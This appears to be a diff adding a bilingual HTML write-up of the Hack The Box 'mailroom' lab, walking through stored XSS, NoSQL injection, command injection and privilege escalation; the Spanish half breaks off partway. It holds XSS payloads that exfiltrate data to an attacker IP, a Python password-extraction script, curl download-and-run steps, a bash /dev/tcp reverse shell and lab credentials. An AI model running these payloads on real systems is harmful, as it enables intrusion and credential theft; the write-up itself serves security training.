@@ -1,0 +1,831 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>mailroom | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">mailroom</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-hard">hard</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+
+            <!-- ─────────────────────────── ENGLISH ─────────────────────────── -->
+            <div id="content-en" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p>The attack began with a public-facing PHP web application that accepted user inquiries and — as the page itself hinted — had an automated "AI" reviewer reading them. This reviewer turned out to be a bot visiting each submitted inquiry URL, making it a perfect target for stored XSS. Cookie exfiltration was a dead end, but the XSS could be weaponised to make cross-origin requests to an internal vhost (<code>staff-review-panel.mailroom.htb</code>) that was otherwise inaccessible from the outside.</p>
+                    <p>The source code of that internal application was leaked through a public Gitea repository, which revealed a MongoDB authentication endpoint vulnerable to NoSQL injection and a <code>shell_exec</code> call susceptible to command injection. Because the 2FA token sent after a successful login was unreachable, the NoSQL injection was pivoted into a blind character-by-character password exfiltration via the XSS channel, eventually yielding credentials for the user <code>tristan</code>, who also reused the same password for SSH.</p>
+                    <p>Once on the box as <code>tristan</code>, a SOCKS proxy was set up over SSH to reach the internal staff panel. A backtick injection in the <code>inquiry_id</code> parameter (the regex sanitisation forgot to block the backtick character) gave RCE as <code>www-data</code> inside a container. Inside the container the <code>.git/config</code> file contained URL-encoded credentials for <code>matthew</code>, allowing lateral movement via <code>su</code>.</p>
+                    <p>Finally, <code>pspy</code> revealed that a <code>kpcli</code> process was spawned every 30 seconds to open a KeePass database. Attaching <code>strace</code> to that process captured the master password being typed character by character. Opening the database exposed the root account password stored in a "root acc" entry, completing the machine.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and services:</p>
+                <pre><code class="language-plaintext">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.54 ((Debian))
+|_http-title: The Mail Room
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>Only two ports are exposed: SSH on 22 and an Apache web server on 80. WhatWeb confirms the stack is PHP 7.4.33 running on Debian. The page footer reveals the domain <code>mailroom.htb</code>, which is added to <code>/etc/hosts</code>.</p>
+
+                <h2>Web Enumeration</h2>
+                <p>Directory fuzzing uncovers the following paths:</p>
+                <pre><code class="language-plaintext">about.php      (Status: 200)
+services.php   (Status: 200)
+contact.php    (Status: 200)
+index.php      (Status: 200)
+inquiries      (Status: 403)</code></pre>
+
+                <p>The <code>about.php</code> page lists staff profiles with names and photos — worth noting in case user enumeration becomes necessary later. The most interesting page is <code>contact.php</code>, which presents a form for submitting inquiries. The page copy reads:</p>
+
+                <blockquote>
+                    <p>"Please fill out the form below to send us an inquiry. Our advanced new AI will automatically read your inquiry and determine its urgency to supply the best response times for you."</p>
+                </blockquote>
+
+                <p>This strongly suggests the submitted content is being visited by an automated bot. Intercepting the form submission with Burp Suite shows a POST to <code>/contact.php</code> with the body <code>email=...&amp;title=...&amp;message=...</code>. After submission, the response provides a unique URL like <code>http://mailroom.htb/inquiries/&lt;hash&gt;.html</code> where the inquiry can be viewed.</p>
+
+                <img src="./media/image2.png" alt="The mailroom contact page showing the inquiry submission form and confirmation message with a unique inquiry URL" />
+
+                <h2>Stored XSS &amp; Bot Interaction</h2>
+                <p>Injecting a classic XSS probe into the message field confirms the vulnerability:</p>
+                <pre><code class="language-html">&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+
+                <p>Visiting the generated inquiry URL triggers the alert. To verify the bot is actually visiting, a fetch payload is submitted pointing to a local HTTP server:</p>
+                <pre><code class="language-html">&lt;script&gt;fetch('http://10.10.14.195');&lt;/script&gt;</code></pre>
+
+                <p>Two requests arrive — one from the attacker's own browser visit, and one originating from the victim machine (<code>10.129.229.1</code>), confirming the bot is real. Attempting to exfiltrate cookies returns an empty value, meaning either no session cookies exist or they are flagged <code>HttpOnly</code>.</p>
+
+                <h2>Subdomain Discovery &amp; Source Code Leak</h2>
+                <p>Virtual host enumeration reveals an additional subdomain:</p>
+                <pre><code class="language-plaintext">git.mailroom.htb  (Status: 200)</code></pre>
+
+                <p>This hosts a Gitea instance with three visible users: <code>administrador</code>, <code>matthew</code>, and <code>tristan</code>. Matthew has a public repository at <code>http://git.mailroom.htb/matthew/staffroom</code> containing the source code of an internal staff application. Cloning and reviewing it reveals two critical pieces of information.</p>
+
+                <p>First, a virtual host reference buried in the authentication flow:</p>
+                <pre><code class="language-php">$message = 'Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=' . $token;</code></pre>
+
+                <p>Adding <code>staff-review-panel.mailroom.htb</code> to <code>/etc/hosts</code> and trying to access it directly returns 403 on every path — the application only accepts connections from within the server itself.</p>
+
+                <p>Second, two commits expose a command injection sink in <code>inspect.php</code>:</p>
+                <pre><code class="language-php">$contents = shell_exec("cat /var/www/mailroom/inquiries/$inquiryId.html");</code></pre>
+
+                <p>The variable <code>$inquiryId</code> is partially sanitised by a regex but, as will become clear later, not thoroughly enough.</p>
+
+                <h2>XSS-Pivoted CORS Bypass to Internal Application</h2>
+                <p>Since the bot runs on the server itself, it <em>can</em> reach the internal vhost. The XSS is used as a relay to make server-side requests. Using <code>fetch()</code> with <code>Content-Type: application/json</code> or <code>application/x-www-form-urlencoded</code> triggers CORS preflight and nothing is returned. However, <code>XMLHttpRequest</code> with <code>application/x-www-form-urlencoded</code> bypasses this restriction in practice.</p>
+
+                <p>The following XSS payload confirms access to the internal application by exfiltrating its HTML back to the attacker:</p>
+                <pre><code class="language-html">&lt;script&gt;
+async function xd() {
+  const response = await fetch('http://staff-review-panel.mailroom.htb');
+  const data = await response.text();
+  fetch('http://10.10.14.195/?xss=' + btoa(data));
+}
+xd();
+&lt;/script&gt;</code></pre>
+
+                <p>Decoding the received base64 shows the login page of the staff panel, confirming the bot is not currently logged in:</p>
+
+                <img src="./media/image3.png" alt="Base64-decoded HTML of the internal staff-review-panel login page rendered without CSS, confirming XSS access to the internal vhost" />
+
+                <h2>NoSQL Injection in the Authentication Endpoint</h2>
+                <p>Reviewing <code>auth.php</code> from the leaked source reveals two bugs in the authentication logic:</p>
+                <pre><code class="language-php">if (!is_string($_POST['email']) || !is_string($_POST['password'])) {
+    header('HTTP/1.1 401 Unauthorized');
+    echo json_encode(['success' => false, 'message' => 'Invalid input detected']);
+    // ← missing exit; here!
+}
+
+$user = $collection->findOne(['email' => $_POST['email'], 'password' => $_POST['password']]);</code></pre>
+
+                <p>The missing <code>exit;</code> after the string-type check means execution continues even when the guard fires — the <code>Invalid input detected</code> message is echoed, but the MongoDB query still runs. Combined with the fact that POST parameters can be passed as arrays (enabling MongoDB operators like <code>$ne</code> and <code>$regex</code>), this enables full NoSQL injection.</p>
+
+                <p>The following XSS payload performs a login bypass using <code>$ne</code> on both fields, finding any valid user:</p>
+                <pre><code class="language-html">&lt;script&gt;
+const req = new XMLHttpRequest();
+req.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", false);
+req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+req.send("email[$ne]=asd@mailroom.htb&amp;password[$ne]=asd");
+
+const exfil = new XMLHttpRequest();
+exfil.open("GET", "http://10.10.14.195/?xss=" + btoa(req.responseText), true);
+exfil.send();
+&lt;/script&gt;</code></pre>
+
+                <p>Decoding the response confirms successful authentication (the 2FA email was triggered):</p>
+                <pre><code class="language-json">{"success":false,"message":"Invalid input detected"}
+{"success":true,"message":"Check your inbox for an email with your 2FA token"}</code></pre>
+
+                <p>The 2FA token, however, is sent by email — and is therefore unreachable externally. This means the bypass alone is insufficient to gain an authenticated session.</p>
+
+                <h2>Blind NoSQL Password Exfiltration via XSS</h2>
+                <p>Instead of bypassing login, the injection can be abused to enumerate the actual password character by character using the MongoDB <code>$regex</code> operator. By testing regex anchors like <code>^a.*</code>, <code>^b.*</code>, etc., and observing whether the response contains <code>"success":true</code> (which indicates the 2FA email was triggered, meaning the credential was correct), it is possible to brute-force the password one character at a time.</p>
+
+                <p>Since the bot processes each submission independently, this is automated with a Python script that submits one XSS payload per character test, waits for the callback, and advances the known prefix on a match. Testing with a few known staff email addresses confirms that <code>tristan@mailroom.htb</code> is a valid account.</p>
+
+                <p>The automated exfiltration script works as follows:</p>
+                <pre><code class="language-python">#!/usr/bin/env python3
+"""
+HTB Mailroom - XSS + NoSQL Injection Password Exfiltration
+Automates blind character-by-character password brute-force via XSS exfil.
+"""
+
+import threading
+import urllib.parse
+import requests
+import base64
+import time
+import sys
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+# ─── CONFIG ───────────────────────────────────────────────────────────────────
+TARGET_URL  = "http://mailroom.htb/contact.php"
+AUTH_URL    = "http://staff-review-panel.mailroom.htb/auth.php"
+EXFIL_HOST  = "10.10.14.195"   # Your tun0 IP
+EXFIL_PORT  = 80
+EMAIL       = "tristan@mailroom.htb"
+MAX_RETRIES = 3
+TIMEOUT     = 8   # seconds to wait for the XSS callback
+CHARSET     = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:,.&lt;&gt;?"
+# ──────────────────────────────────────────────────────────────────────────────
+
+callback_event   = threading.Event()
+callback_payload = None
+current_token    = None   # only accept callbacks matching this token
+
+class ExfilHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        global callback_payload, current_token
+        if "?token=" in self.path and "&amp;resp=" in self.path:
+            try:
+                qs     = self.path.split("?", 1)[1]
+                params = dict(p.split("=", 1) for p in qs.split("&amp;"))
+                token  = params.get("token", "")
+                b64    = params.get("resp",  "")
+                if token != current_token:
+                    self.send_response(200); self.end_headers(); return
+                decoded = base64.b64decode(
+                    urllib.parse.unquote(b64)
+                ).decode("utf-8", errors="replace")
+            except Exception:
+                decoded = ""
+            callback_payload = decoded
+            callback_event.set()
+        self.send_response(200); self.end_headers()
+
+    def log_message(self, fmt, *args):
+        pass  # silence access logs
+
+def start_server():
+    server = HTTPServer(("0.0.0.0", EXFIL_PORT), ExfilHandler)
+    t = threading.Thread(target=server.serve_forever, daemon=True)
+    t.start()
+    return server
+
+def build_xss_payload(regex: str, token: str) -> str:
+    script = (
+        f'&lt;script&gt;\n'
+        f'const req = new XMLHttpRequest();\n'
+        f'req.open("POST", "{AUTH_URL}", false);\n'
+        f'req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");\n'
+        f'req.send("email={EMAIL}&amp;password[$regex]={regex}");\n'
+        f'\n'
+        f'const exfil = new XMLHttpRequest();\n'
+        f'exfil.open("GET", "http://{EXFIL_HOST}/?token={token}&amp;resp=" + btoa(req.responseText), true);\n'
+        f'exfil.send();\n'
+        f'&lt;/script&gt;'
+    )
+    return script
+
+def send_xss(regex: str) -> str | None:
+    global callback_payload, current_token
+    token          = str(time.time_ns())
+    current_token  = token
+    callback_payload = None
+    callback_event.clear()
+    xss  = build_xss_payload(regex, token)
+    data = {"email": "attacker@attacker.com", "title": "test", "message": xss}
+    try:
+        requests.post(TARGET_URL, data=data, timeout=10)
+    except requests.RequestException as e:
+        print(f" [!] POST error: {e}")
+        return None
+    triggered = callback_event.wait(timeout=TIMEOUT)
+    return callback_payload if triggered else None
+
+def is_correct(response: str) -> bool:
+    if response is None:
+        return False
+    return (
+        '"success":true' in response
+        and "2FA token" in response
+        and "Invalid email or password" not in response
+    )
+
+def test_char(regex: str) -> bool:
+    for attempt in range(1, MAX_RETRIES + 1):
+        resp = send_xss(regex)
+        if resp is not None:
+            return is_correct(resp)
+        print(f" [~] No callback (attempt {attempt}/{MAX_RETRIES}), retrying...")
+        time.sleep(1)
+    print(f" [!] All retries exhausted for regex: {regex}")
+    return False
+
+def re_escape(s: str) -> str:
+    special = r"\.+*?[](){}^$|"
+    result  = ""
+    for c in s:
+        result += ("\\" + c) if c in special else c
+    return result
+
+def brute_force_password() -> str:
+    password = ""
+    print(f"\n[*] Starting NoSQL injection password exfiltration for: {EMAIL}")
+    print(f"[*] Listening for callbacks on {EXFIL_HOST}:{EXFIL_PORT}\n")
+    while True:
+        found_char = False
+        for ch in CHARSET:
+            regex = f"^{re_escape(password + ch)}.*"
+            print(f"[?] Testing: '{password}{ch}' (regex: {regex})", end="\r", flush=True)
+            if test_char(regex):
+                password   += ch
+                found_char  = True
+                print(f"\n[+] Found character: '{ch}' → Password so far: {password}")
+                break
+        if not found_char:
+            regex = f"^{re_escape(password)}$"
+            if test_char(regex):
+                print(f"\n[✓] Password complete: {password}")
+            else:
+                print(f"\n[!] Could not find next character. Password so far: {password}")
+            break
+    return password
+
+if __name__ == "__main__":
+    print("[*] Starting exfil listener...")
+    srv = start_server()
+    print(f"[*] HTTP server listening on 0.0.0.0:{EXFIL_PORT}")
+    try:
+        pwd = brute_force_password()
+        print(f"\n[★] FINAL PASSWORD: {pwd}")
+    except KeyboardInterrupt:
+        print("\n[!] Interrupted by user.")
+    finally:
+        srv.shutdown()</code></pre>
+
+                <p>The script exposes an HTTP server on port 80 to receive the XSS callbacks, and uses retry logic to compensate for the occasional missed callback — a necessity when the trigger is an automated bot rather than a human. The process is slow (one HTTP round-trip per character test), but after some time the following credentials are recovered:</p>
+
+                <pre><code class="language-plaintext">tristan@mailroom.htb : 69trisRulez!</code></pre>
+
+                <p>Even with these credentials, logging into the staff panel is impossible without the 2FA token. However, testing password reuse over SSH works immediately:</p>
+                <pre><code class="language-bash">ssh tristan@mailroom.htb</code></pre>
+
+                <p>SSH access as <code>tristan</code> is established. Checking <code>/var/mail/tristan</code> confirms that the 2FA emails do arrive here — so had direct shell access been available from the start, the NoSQL bypass + email token would have been another valid path.</p>
+
+                <h2>SOCKS Proxy to Access the Internal Panel</h2>
+                <p>With SSH access, the internal staff panel can now be reached directly. Because the service is not bound to a specific port that can be forwarded with a simple <code>-L</code> tunnel (it's a vhost-based routing at the web layer), a SOCKS proxy is the cleaner approach. <code>/etc/hosts</code> on the attacker machine is updated to resolve the internal vhost to localhost:</p>
+                <pre><code class="language-plaintext">127.0.0.1  localhost staff-review-panel.mailroom.htb</code></pre>
+
+                <p>Then a dynamic SOCKS tunnel is established over SSH:</p>
+                <pre><code class="language-bash">ssh -N -D 1080 tristan@mailroom.htb</code></pre>
+
+                <p>In Firefox, FoxyProxy is configured to route traffic through <code>127.0.0.1:1080</code> (SOCKS5):</p>
+
+                <img src="./media/image1.png" alt="FoxyProxy configuration in Firefox showing a SOCKS5 proxy set to 127.0.0.1 on port 1080 for routing traffic through the SSH tunnel" />
+
+                <p>One additional change is required in Firefox's <code>about:config</code> to make DNS resolution go through the proxy (otherwise the vhost won't resolve correctly):</p>
+                <pre><code class="language-plaintext">network.proxy.socks_remote_dns = true</code></pre>
+
+                <p>With this in place, the staff review panel is fully accessible. It shows an administration interface for reviewing the submitted inquiries and exposes an endpoint at <code>POST /inspect.php</code> where an <code>inquiry_id</code> parameter controls which inquiry is loaded.
+
+                <h2>Command Injection via Backtick — RCE as www-data</h2>
+                <p>The sanitisation applied to <code>inquiry_id</code> in the leaked source is:</p>
+                <pre><code class="language-php">if (isset($_POST['inquiry_id'])) {
+    $inquiryId = preg_replace('/[\$&lt;&gt;;|&amp;{}\(\)\[\]\'\"]/', '', $_POST['inquiry_id']);
+    $contents  = shell_exec("cat /var/www/mailroom/inquiries/$inquiryId.html");
+}</code></pre>
+
+                <p>The regex strips <code>$</code>, <code>&lt;</code>, <code>&gt;</code>, <code>;</code>, <code>|</code>, <code>&amp;</code>, <code>{}</code>, <code>()</code>, <code>[]</code>, and quotes — but crucially it does <strong>not</strong> block the backtick character (<code>`</code>). In bash, backticks perform command substitution the same way <code>$()</code> does, so the shell will execute whatever is between them.</p>
+
+                <p>A simple ping-back confirms execution:</p>
+                <pre><code class="language-plaintext">inquiry_id=`curl 10.10.14.55`</code></pre>
+
+                <p>The attacker's HTTP server receives a connection from the target, confirming RCE. To obtain a shell, a reverse shell script is first staged on the attacker's HTTP server:</p>
+                <pre><code class="language-bash">bash -c "bash -i >& /dev/tcp/10.10.14.55/443 0>&1"</code></pre>
+
+                <p>Since the pipe character is blocked by the sanitiser, the payload is split into two requests — first download the script, then execute it:</p>
+                <pre><code class="language-plaintext">inquiry_id=`curl 10.10.14.55 -o /tmp/xd`
+
+inquiry_id=`bash /tmp/xd`</code></pre>
+
+                <p>A reverse shell as <code>www-data</code> is received inside what appears to be a Docker container (hostname is a short hex string, no real init system, etc.).</p>
+
+                <h2>Credentials Leak from .git/config — Lateral Movement to matthew</h2>
+                <p>Exploring the container's filesystem, the web application directory is found at <code>/var/www/staffroom</code>. This is a git repository, and its config file contains the remote URL with embedded credentials:</p>
+                <pre><code class="language-ini">[core]
+    repositoryformatversion = 0
+    filemode = true
+    bare = false
+    logallrefupdates = true
+[remote "origin"]
+    url = http://matthew:HueLover83%23@gitea:3000/matthew/staffroom.git
+    fetch = +refs/heads/*:refs/remotes/origin/*
+[branch "main"]
+    remote = origin
+    merge = refs/heads/main
+[user]
+    email = matthew@mailroom.htb</code></pre>
+
+                <p>The <code>%23</code> in the URL is a URL-encoded hash symbol (<code>#</code>). Decoding it yields:</p>
+                <pre><code class="language-plaintext">matthew : HueLover83#</code></pre>
+
+                <p>SSH as <code>matthew</code> requires a public key, but switching users from within the existing shell works:</p>
+                <pre><code class="language-bash">su matthew</code></pre>
+
+                <p>The credentials are accepted and the session switches to <code>matthew</code>. At this point a KeePass database file is visible in the home directory:</p>
+                <pre><code class="language-bash">ls -lh ~
+# -rw-r--r-- 1 matthew matthew 2.0K Mar 16  2023 personal.kdbx</code></pre>
+
+                <h2>KeePass Master Password via strace Process Tracing</h2>
+                <p>Initial attempts to open <code>personal.kdbx</code> with <code>kpcli</code> fail — the known passwords don't work. Running <code>pspy64</code> to monitor running processes reveals something interesting: every 30 seconds, a <code>kpcli</code> process is launched under UID 1001 (matthew):</p>
+                <pre><code class="language-plaintext">CMD: UID=1001 PID=24427 | -bash -c /usr/bin/kpcli
+CMD: UID=1001 PID=24429 | /usr/bin/perl /usr/bin/kpcli</code></pre>
+
+                <p>Attempting to open the database manually now shows a lock file warning, indicating another process already has it open:</p>
+                <pre><code class="language-plaintext">kpcli:/> open personal.kdbx
+WARNING: A KeePassX-style lock file is in place for this file.
+It may be opened elsewhere. Be careful of saving!
+Please provide the master password:</code></pre>
+
+                <p>Since <code>kpcli</code> is a Perl script that reads the password from standard input via <code>ioctl</code> (disabling terminal echo), <code>strace</code> can intercept all system calls including the character-by-character keyboard reads. The command is run until it attaches to an active <code>perl</code> process:</p>
+                <pre><code class="language-bash">strace -p $(pidof perl)</code></pre>
+
+                <p>The output is substantial. Analysing it shows the password being read one character at a time with 50 ms polling intervals, with a backspace mid-way through correcting a typo. Reconstructing the sequence:</p>
+
+                <blockquote>
+                    <p>Characters typed: <code>!sEcUr3p4$$w01</code> → backspace (erases <code>1</code>) → <code>r</code>, <code>d</code>, <code>9</code> → Enter.<br>
+                    Final password: <code>!sEcUr3p4$$w0rd9</code></p>
+                </blockquote>
+
+                <p>Opening the database with this master password succeeds:</p>
+                <pre><code class="language-plaintext">kpcli:/> open personal.kdbx
+Please provide the master password: *****************
+kpcli:/> ls
+=== Groups ===
+Root/
+kpcli:/> cd Root
+kpcli:/Root> ls
+=== Entries ===
+0. food account          door.dash.local
+1. GItea Admin account   git.mailroom.htb
+2. gitea database password
+3. My Gitea Account      git.mailroom.htb
+4. root acc</code></pre>
+
+                <p>The "root acc" entry is shown with the <code>-f</code> flag to reveal the password:</p>
+                <pre><code class="language-plaintext">kpcli:/Root> show root\ acc -f
+
+Path:  /Root/
+Title: root acc
+Uname: root
+Pass:  a$gBa3!GA8
+URL:
+Notes: root account for sysadmin jobs</code></pre>
+
+                <p>Switching to root with <code>su root</code> and entering <code>a$gBa3!GA8</code> succeeds, granting full system access.</p>
+            </div>
+
+            <!-- ─────────────────────────── ESPAÑOL ─────────────────────────── -->
+            <div id="content-es" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p>El ataque comenzó con una aplicación PHP pública que aceptaba consultas de usuarios y, tal como indicaba la propia página, contaba con una "IA" automatizada que las leía. Ese revisor resultó ser un bot que visitaba cada URL de consulta enviada, convirtiéndolo en un objetivo ideal para XSS almacenado. La exfiltración de cookies fue un callejón sin salida, pero el XSS podía armarse para realizar peticiones cross-origin a un vhost interno (<code>staff-review-panel.mailroom.htb</code>) inaccesible desde el exterior.</p>
+                    <p>El código fuente de esa aplicación interna estaba expuesto en un repositorio público de Gitea, lo que reveló un endpoint de autenticación MongoDB vulnerable a inyección NoSQL y una llamada a <code>shell_exec</code> susceptible de inyección de comandos. Como el token 2FA enviado tras un login exitoso era inalcanzable, la inyección NoSQL se reconvirtió en una exfiltración ciega carácter a carácter a través del canal XSS, consiguiendo finalmente las credenciales del usuario <code>tristan</code>, quien reutilizaba la misma contraseña para SSH.</p>
+                    <p>Una vez en la máquina como <code>tristan</code>, se configuró un proxy SOCKS sobre SSH para acceder al panel interno. Una inyección de backtick en el parámetro <code>inquiry_id</code> (el regex de saneamiento olvidó bloquear ese carácter) proporcionó RCE como <code>www-data</code> dentro de un contenedor. Dentro del contenedor, el archivo <code>.git/config</code> contenía credenciales con codificación URL para <code>matthew</code>, lo que permitió el movimiento lateral mediante <code>su</code>.</p>
+                    <p>Por último, <code>pspy</code> reveló que cada 30 segundos se lanzaba un proceso <code>kpcli</code> para abrir una base de datos KeePass. Enganchando <code>strace</code> a ese proceso se capturó la contraseña maestra tecleada carácter a carácter. Abriendo la base de datos se expuso la contraseña de root almacenada en una entrada "root acc", completando la máquina.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios:</p>
+                <pre><code class="language-plaintext">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.54 ((Debian))
+|_http-title: The Mail Room
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>Solo hay dos puertos expuestos: SSH en el 22 y un servidor web Apache en el 80. WhatWeb confirma que la tecnología es PHP 7.4.33 sobre Debian. El footer de la página revela el dominio <code>mailroom.htb</code>, que añado al <code>/etc/hosts</code>.</p>
+
+                <h2>Enumeración Web</h2>
+                <p>El fuzzing de directorios descubre las siguientes rutas:</p>
+                <pre><code class="language-plaintext">about.php      (Status: 200)
+services.php   (Status: 200)
+contact.php    (Status: 200)
+index.php      (Status: 200)
+inquiries      (Status: 403)</code></pre>
+
+                <p>La página <code>about.php</code> lista perfiles del personal con nombres y fotos — útil por si la enumeración de usuarios es necesaria más adelante. La página más interesante es <code>contact.php</code>, que presenta un formulario para enviar consultas. El texto de la página dice:</p>
+
+                <blockquote>
+                    <p>"Please fill out the form below to send us an inquiry. Our advanced new AI will automatically read your inquiry and determine its urgency to supply the best response times for you."</p>
+                </blockquote>
+
+                <p>Esto sugiere fuertemente que el contenido enviado está siendo visitado por un bot automatizado. Interceptando el envío del formulario con Burp Suite se ve un POST a <code>/contact.php</code> con el cuerpo <code>email=...&amp;title=...&amp;message=...</code>. Tras el envío, la respuesta proporciona una URL única como <code>http://mailroom.htb/inquiries/&lt;hash&gt;.html</code> donde se puede ver la consulta.</p>
+
+                <img src="./media/image2.png" alt="Página de contacto de mailroom mostrando el formulario de envío de consultas y el mensaje de confirmación con una URL única de seguimiento" />
+
+                <h2>XSS Almacenado e Interacción con el Bot</h2>
+                <p>Inyectando una sonda XSS clásica en el campo de mensaje se confirma la vulnerabilidad:</p>
+                <pre><code class="language-html">&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+
+                <p>Al visitar la URL generada se dispara la alerta. Para verificar que el bot visita realmente la consulta, envío un payload de fetch apuntando a mi servidor HTTP local:</p>
+                <pre><code class="language-html">&lt;script&gt;fetch('http://10.10.14.195');&lt;/script&gt;</code></pre>
+
+                <p>Llegan dos peticiones: una desde mi propio navegador al visitar la URL, y otra originada desde la máquina víctima (<code>10.129.229.1</code>), confirmando que el bot es real. Intentar exfiltrar cookies devuelve un valor vacío, lo que significa que o bien no hay cookies de sesión, o bien están marcadas como <code>HttpOnly</code>.</p>
+
+                <h2>Descubrimiento de Subdominios y Fuga de Código Fuente</h2>
+                <p>La enumeración de virtual hosts revela un subdominio adicional:</p>
+                <pre><code class="language-plaintext">git.mailroom.htb  (Status: 200)</code></pre>
+
+                <p>Aquí hay una instancia de Gitea con tres usuarios visibles: <code>administrador</code>, <code>matthew</code> y <code>tristan</code>. Matthew tiene un repositorio público en <code>http://git.mailroom.htb/matthew/staffroom</code> que contiene el código fuente de una aplicación interna para el personal. Al clonarlo y revisarlo aparecen dos datos críticos.</p>
+
+                <p>Primero, una referencia a un virtual host enterrada en el flujo de autenticación:</p>
+                <pre><code class="language-php">$message = 'Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=' . $token;</code></pre>
+
+                <p>Añadir <code>staff-review-panel.mailroom.htb</code> al <code>/etc/hosts</code> e intentar acceder directamente devuelve 403 en cualquier ruta — la aplicación solo acepta conexiones desde el propio servidor.</p>
+
+                <p>Segundo, dos commits exponen un sink de inyección de comandos en <code>inspect.php</code>:</p>
+                <pre><code class="language-php">$contents = shell_exec("cat /var/www/mailroom/inquiries/$inquiryId.html");</code></pre>
+
+                <p>La variable <code>$inquiryId</code> está parcialmente saneada por un regex pero, como quedará claro más adelante, no de forma suficientemente exhaustiva.</p>
+
+                <h2>Bypass CORS Mediante XSS Pivotado a la Aplicación Interna</h2>
+                <p>Como el bot se ejecuta en el propio servidor, <em>sí puede</em> acceder al vhost interno. El XSS se usa como relay para realizar peticiones desde el lado del servidor. Usar <code>fetch()</code> con <code>Content-Type: application/json</code> o <code>application/x-www-form-urlencoded</code> dispara el preflight CORS y no se recibe nada. Sin embargo, <code>XMLHttpRequest</code> con <code>application/x-www-form-urlencoded</code> esquiva esta restricción en la práctica.</p>
+
+                <p>El siguiente payload XSS confirma el acceso a la aplicación interna exfiltrando su HTML de vuelta al atacante:</p>
+                <pre><code class="language-html">&lt;script&gt;
+async function xd() {
+  const response = await fetch('http://staff-review-panel.mailroom.htb');
+  const data = await response.text();
+  fetch('http://10.10.14.195/?xss=' + btoa(data));
+}
+xd();
+&lt;/script&gt;</code></pre>
+
+                <p>Decodificando el base64 recibido se muestra la página de login del panel interno, confirmando que el XSS tiene acceso al vhost y que el bot no está autenticado actualmente:</p>
+
+                <img src="./media/image3.png" alt="HTML decodificado en base64 de la página de login del staff-review-panel interno renderizado sin CSS, confirmando acceso XSS al vhost interno" />
+
+                <h2>Inyección NoSQL en el Endpoint de Autenticación</h2>
+                <p>Revisando <code>auth.php</code> del código fuente filtrado se observan dos bugs en la lógica de autenticación:</p>
+                <pre><code class="language-php">if (!is_string($_POST['email']) || !is_string($_POST['password'])) {
+    header('HTTP/1.1 401 Unauthorized');
+    echo json_encode(['success' => false, 'message' => 'Invalid input detected']);
+    // ← falta exit; aquí
+}
+
+$user = $collection->findOne(['email' => $_POST['email'], 'password' => $_POST['password']]);</code></pre>
+
+                <p>La ausencia del <code>exit;</code> tras la comprobación de tipos hace que la ejecución continúe incluso cuando el guard se activa — se muestra el mensaje <code>Invalid input detected</code>, pero la query MongoDB se ejecuta igualmente. Combinado con el hecho de que los parámetros POST pueden enviarse como arrays (habilitando operadores MongoDB como <code>$ne</code> y <code>$regex</code>), esto permite una inyección NoSQL completa.</p>
+
+                <p>El siguiente payload XSS realiza un bypass de login usando <code>$ne</code> en ambos campos, encontrando cualquier usuario válido:</p>
+                <pre><code class="language-html">&lt;script&gt;
+const req = new XMLHttpRequest();
+req.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", false);
+req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+req.send("email[$ne]=asd@mailroom.htb&amp;password[$ne]=asd");
+
+const exfil = new XMLHttpRequest();
+exfil.open("GET", "http://10.10.14.195/?xss=" + btoa(req.responseText), true);
+exfil.send();
+&lt;/script&gt;</code></pre>
+
+                <p>Decodificando la respuesta se confirma la autenticación exitosa (el correo 2FA fue enviado):</p>
+                <pre><code class="language-json">{"success":false,"message":"Invalid input detected"}
+{"success":true,"message":"Check your inbox for an email with your 2FA token"}</code></pre>
+
